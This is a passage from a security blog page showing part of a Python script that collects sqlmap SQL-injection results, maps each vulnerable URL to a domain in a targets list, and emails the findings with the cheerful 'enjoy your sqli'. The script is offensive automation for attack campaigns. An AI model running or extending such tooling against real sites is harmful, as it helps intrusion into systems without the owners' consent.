	<span class="n">sqli_url_domain</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(https://)|(https://)|(\s)|(/.*)|(:.*)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">url</span><span class="p">)</span>
	<span class="c1">#print sqli_url_domain
</span>
	<span class="n">f</span><span class="o">=</span><span class="nf">open</span><span class="p">(</span><span class="sh">"</span><span class="s">targets.txt</span><span class="sh">"</span><span class="p">,</span><span class="sh">"</span><span class="s">r+</span><span class="sh">"</span><span class="p">)</span>
	<span class="n">targets_list</span><span class="o">=</span><span class="n">f</span><span class="p">.</span><span class="nf">readlines</span><span class="p">()</span>
	<span class="n">f</span><span class="p">.</span><span class="nf">close</span><span class="p">()</span>
	<span class="n">all_list</span><span class="o">=</span><span class="p">[]</span>
	<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">targets_list</span><span class="p">:</span>
		<span class="n">each</span><span class="o">=</span><span class="n">re</span><span class="p">.</span><span class="nf">sub</span><span class="p">(</span><span class="sa">r</span><span class="sh">'</span><span class="s">(https://)|(https://)|(\s)|(/.*)|(:.*)</span><span class="sh">'</span><span class="p">,</span><span class="sh">""</span><span class="p">,</span><span class="n">each</span><span class="p">)</span>
		<span class="n">domain</span><span class="o">=</span><span class="p">[]</span>
		<span class="n">domain</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">each</span><span class="p">)</span>
		<span class="k">try</span><span class="p">:</span>
			<span class="n">all_nics_ip</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">gethostbyname_ex</span><span class="p">(</span><span class="n">each</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
			<span class="n">each_list</span><span class="o">=</span><span class="n">all_nics_ip</span><span class="o">+</span><span class="n">domain</span>
			<span class="n">all_list</span><span class="p">.</span><span class="nf">append</span><span class="p">(</span><span class="n">each_list</span><span class="p">)</span>
		<span class="k">except</span><span class="p">:</span>
			<span class="k">pass</span>
	<span class="c1">#print all_list
</span>	<span class="k">for</span> <span class="n">single_list</span> <span class="ow">in</span> <span class="n">all_list</span><span class="p">:</span>
		<span class="k">try</span><span class="p">:</span>			
			<span class="n">sqli_url_ip</span><span class="o">=</span><span class="n">socket</span><span class="p">.</span><span class="nf">gethostbyname_ex</span><span class="p">(</span><span class="n">sqli_url_domain</span><span class="p">)[</span><span class="mi">2</span><span class="p">]</span>
			<span class="c1">#print sqli_url_ip
</span>			<span class="c1">#print 55555555
</span>			<span class="c1">#print single_list
</span>			<span class="k">if</span> <span class="n">sqli_url_ip</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="n">single_list</span><span class="p">:</span>				
				<span class="c1">#print 66666666
</span>				<span class="c1">#print single_list[-1]
</span>				<span class="k">return</span> <span class="n">single_list</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>	
		<span class="k">except</span><span class="p">:</span>
			<span class="k">pass</span>
		

<span class="k">def</span> <span class="nf">get_msg_to_send</span><span class="p">():</span>
	<span class="n">msg_list</span><span class="o">=</span><span class="nf">get_result_from_folder</span><span class="p">(</span><span class="sh">"</span><span class="s">/root/.sqlmap/output</span><span class="sh">"</span><span class="p">)</span>                
	<span class="n">msg_to_send</span><span class="o">=</span><span class="sh">"</span><span class="s">Good News!!! below are the results of sqli output:</span><span class="se">\r\n</span><span class="s">-----------------------------------------------------------------------------</span><span class="se">\r\n</span><span class="sh">"</span>
	<span class="k">for</span> <span class="n">each</span> <span class="ow">in</span> <span class="n">msg_list</span><span class="p">:</span>
		<span class="k">for</span> <span class="n">one</span> <span class="ow">in</span> <span class="n">each</span><span class="p">:</span>
			<span class="n">main_target_domain</span><span class="o">=</span><span class="nf">get_source_domain_of_target_sqli_urls</span><span class="p">(</span><span class="n">one</span><span class="p">)</span>
			<span class="n">msg_to_send</span><span class="o">+=</span><span class="p">(</span><span class="n">one</span><span class="o">+</span><span class="sh">'</span><span class="se">\r\n</span><span class="sh">'</span><span class="p">)</span>
			<span class="n">msg_to_send</span><span class="o">+=</span><span class="sh">'</span><span class="s">----&gt;&gt;&gt;&gt;&gt;this domain belongs to the main target domain:&gt;&gt;&gt;%s&lt;&lt;&lt;---</span><span class="se">\r\n</span><span class="sh">'</span> <span class="o">%</span> <span class="n">main_target_domain</span>
			<span class="n">msg_to_send</span><span class="o">+=</span><span class="sh">'</span><span class="s">-----------------------------------------------------------------------------</span><span class="se">\r\n</span><span class="sh">'</span>		
	<span class="n">msg_to_send</span><span class="o">+=</span><span class="sh">'</span><span class="s">enjoy your sqli:D</span><span class="sh">'</span>
	<span class="k">return</span> <span class="n">msg_to_send</span>

<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
	<span class="n">msg</span><span class="o">=</span><span class="nf">get_msg_to_send</span><span class="p">()</span>
	<span class="k">print</span> <span class="mi">66666666666666666666666666666666666</span>
	<span class="nf">sendMail</span><span class="p">(</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
	<span class="nf">sendMail</span><span class="p">(</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>
	<span class="nf">sendMail</span><span class="p">(</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">xxxxxxxxxx</span><span class="sh">'</span><span class="p">,</span><span class="n">msg</span><span class="p">)</span>


<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="sh">'</span><span class="s">__main__</span><span class="sh">'</span><span class="p">:</span>
	<span class="nf">main</span><span class="p">()</span>
</code></pre></div></div>

</span>

        


        
        <div class="tags">
          <small>
          <i class="fa fa-tags"></i>
            python, sqlmap, scan
          </small>
        </div>
        

      </div>

      


<!-- 个人增加织网背景效果 -->
<!--
<script type="text/javascript" color="255,255,255" opacity='0.7' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
-->


      



      


      

    </div>

  </div>

</div>




      </div>
    </div>

    <div class="footer clearfix">
  <div class="col-md-12">
		  <!--for better experience please install font 文泉驿等宽正黑-->
Since March 2016 the 3xp10it.cc has been running  <span id="times" style="align: center no:1px solid black"></span><br />
	<SCRIPT language=javascript> 
	<!-- 
	function show_date_time(){ 
		window.setTimeout("show_date_time()", 1000); 
		BirthDay=new Date("3/7/2016 20:00:00");
		today=new Date(); 
		timeold=(today.getTime() - BirthDay.getTime()); 
		sectimeold=timeold/1000 
		secondsold=Math.floor(sectimeold); 
		msPerDay=24*60*60*1000 
		e_daysold=timeold/msPerDay 
		daysold=Math.floor(e_daysold); 
		e_hrsold=(e_daysold-daysold)*24; 
		hrsold=Math.floor(e_hrsold); 
		e_minsold=(e_hrsold-hrsold)*60; 
		minsold=Math.floor((e_hrsold-hrsold)*60); 
		seconds=Math.floor((e_minsold-minsold)*60); 
		//times = document.getElementById("times");
		times.innerHTML="<span>"+daysold+ "days " +hrsold+"hours "+minsold+"minutes"+seconds+"seconds"+"</span>" ; 
	} 
	show_date_time(); 
	//--> 
	</SCRIPT>
  </div>
</div>

<div class="my-home"><i class="fa fa-home" aria-hidden="true"></i><a href="/index2.html"> <font color="white">home</font></a></div>
<div class="my-papers"><i class="fa fa-github" aria-hidden="true"></i><a href="https://github.com/3xp10it" target="_top"> <font color="white">github</font></a></div>
<div class="my-search"><i class="fa fa-search" aria-hidden="true"></i><a href="/search/"> <font color="white">search</font></a></div>
<div class="my-archive"><i class="fa fa-folder" aria-hidden="true"></i><a href="/my-archive/"> <font color="white">archive</font></a></div>
<div class="my-categories"><i class="fa fa-apple" aria-hidden="true"></i><a href="/my-categories/"> <font color="white">category</font></a></div>


<script src="/js/jquery-1.11.0.min.js"></script>
<!--
<script src="/js/bootstrap.min.js"></script>
-->
<script src="https://cdn.bootcss.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>

<script src="/js/jquery.mmenu.min.all.js"></script>
<script src="/js/highlight.min.js"></script>
<script>hljs.initHighlightingOnLoad();</script>
<script type="text/javascript">
   $(document).ready(function() {
      $("#my-menu").mmenu().on( "closed.mm", function() {
            $(".menu-button").show();
         });
      $(".menu-button").click(function() {
        $(".menu-button").hide();
        $("#my-menu").trigger("open.mm");
      });
   });
</script>





<!--
<script type="text/javascript"> 
$youziku.load("h1,h2,h3,h4,h5,h6,code,.content,.content-panel,.gravatar,pre,body", "354f6990dc1b43608d3eb96d50273504", "WenQuanYi_Zen_Hei_Mono");
$youziku.draw(); 
</script>
-->


    </body>
</html>
